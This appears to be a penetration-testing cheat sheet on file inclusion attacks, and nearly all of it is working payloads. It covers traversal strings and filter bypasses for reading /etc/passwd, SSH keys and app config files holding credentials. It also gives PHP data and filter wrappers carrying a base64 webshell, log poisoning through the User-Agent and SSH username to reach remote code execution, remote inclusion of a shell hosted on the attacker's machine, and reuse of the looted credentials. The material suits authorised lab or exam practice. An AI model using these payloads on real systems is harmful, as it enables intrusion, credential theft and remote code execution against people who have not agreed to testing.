## Goal
Read local files (LFI) or include remote code (RFI) via a vulnerable file parameter. LFI -> creds/keys/logs, and via wrappers or log poisoning -> RCE.

**Checklist**
- [ ] a param loads a file/page? (?file= ?page= ?lang=)
- [ ] traversal reads /etc/passwd? (try filter bypasses)
- [ ] php filter reads source?
- [ ] log poisoning / wrapper -> RCE?
- [ ] RFI (allow_url_include) -> host a shell?

# Commands

### Step 1: Traversal + filter bypasses (Linux)
```bash
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd               # double-dot bypass
?file=/etc/passwd%00                             # null byte (PHP < 5.3.4)
?file=..%252f..%252f..%252fetc/passwd            # double URL-encode
?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd            # URL-encoded dots
```

### Step 2: Windows paths
```bash
?file=..\..\..\..\Windows\System32\drivers\etc\hosts
?file=..%5c..%5c..%5cWindows\System32\drivers\etc\hosts
?file=C:\inetpub\wwwroot\web.config
?file=..\..\..\..\Users\<username>\.ssh\id_rsa  # hypothesis if port 22 is open; private key may not exist
```

### Step 2b: Loot third-party app configs (where creds ACTUALLY live)
`/etc/passwd` (Linux) or `win.ini` (Windows) only **proves** the read works - it rarely holds the win.
The creds are usually in the config file of the **installed third-party app** whose CVE gave you the
read. Two moves:
1. Read the **PoC / exploit-db entry** for THIS app - it often names the exact config file and path.
2. Read that file through the traversal.

```text
Windows app-config examples (adapt vendor/app):
  C:\<App>\...\AppConfig.xml         SynaMan/Synametrics - held plaintext creds on PG fish
  C:\glassfish4\glassfish\domains\domain1\config\domain.xml   GlassFish master config
  C:\inetpub\wwwroot\web.config      IIS app - DB connection strings
  C:\xampp\{apache\conf\httpd.conf, mysql\bin\my.ini, phpMyAdmin\config.inc.php}
Linux app-config examples:
  /var/www/html/config.php, wp-config.php, .env, /opt/<app>/conf/*, tomcat-users.xml
```
Then **reuse** any credential on every other service (password reuse). Login surfaces:
RDP 3389 / SMB 445 / WinRM 5985.

### Step 3: PHP wrappers (read source / RCE)
```bash
?file=php://filter/convert.base64-encode/resource=index.php    # source -> base64 (decode locally)
?file=php://filter/convert.base64-encode/resource=config.php
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==   # <?php system($_GET[c]) ?> ; add &c=id
?file=expect://id                                              # if expect module loaded
echo "BASE64_OUTPUT" | base64 -d
```

### Step 4: Log poisoning -> RCE
```bash
# apache/nginx access log via User-Agent:
curl -A '<?php system($_GET["c"]); ?>' "http://$IP/"
curl "http://$IP/page.php?file=../../../../var/log/apache2/access.log&c=id"
# ssh auth.log via username:
ssh '<?php system($_GET["c"]); ?>'@$IP
curl "http://$IP/page.php?file=../../../../var/log/auth.log&c=id"
```

### Step 5: RFI (allow_url_include=On)
```bash
python3 -m http.server 80        # host shell.php on kali
curl "http://$IP/?file=http://<YOUR_IP>/shell.php"
```

### Helpline
```bash
# targets: /etc/passwd, /var/www/html/config.php, ~/.ssh/id_rsa, /var/log/{apache2,nginx}/access.log
# nginx log path: /var/log/nginx/access.log ; mail: swaks --body '<?php...?>' then include /var/mail/<user>
# combine LFI + upload: upload a .txt shell, include it
```
